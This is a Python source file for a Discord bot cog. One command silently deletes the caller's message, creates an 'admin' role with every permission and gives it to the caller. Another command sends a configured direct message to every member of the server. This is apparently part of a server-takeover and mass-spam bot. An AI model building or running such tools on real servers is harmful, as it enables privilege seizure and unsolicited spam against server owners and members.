"""DM amd admin| files"""

# Discord
import discord
from discord import Permissions
from discord.ext import commands

# Async
import asyncio
from asyncio import sleep

# Utils
from utils import get_data

class Extras(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        
        
    @commands.command(aliases=['admin', 'Give_admin', 'Admin'])
    async def give_admin(self, ctx):
        """Create and give you a role with all permissions"""
        get_data('admin_name')
        guild = ctx.guild
        member = ctx.message.author
        await ctx.message.delete()
        try:
            await guild.create_role(
                name='admin',
                permissions=Permissions.all()
                )
        except:
            print('Cant make the admin role')
            
        role = discord.utils.get(member.guild.roles, name='admin')
        
        await member.add_roles(role)
        try:
            await member.add_roles(role)
            print('You now have admin!')
        except:
            print('Cant give you admin role :(')
            
        
    @commands.command(aliases=['dm', 'Dm', 'Send_dm'])
    async def send_dm(self, ctx):
        """Try to send a message to all users in the guild"""
        await ctx.message.delete()
        guild = ctx.message.guild
        for member in guild.members:
                try:
                    if member.id != self.bot.user.id:
                        await member.send(get_data('direct_message_name'))
                        print(f'A message was sent to {member}')
                        await sleep(0.5)
                except:
                    pass
                    print(f'Message cant be sent to {member}')


def setup(bot):
    bot.add_cog(Extras(bot))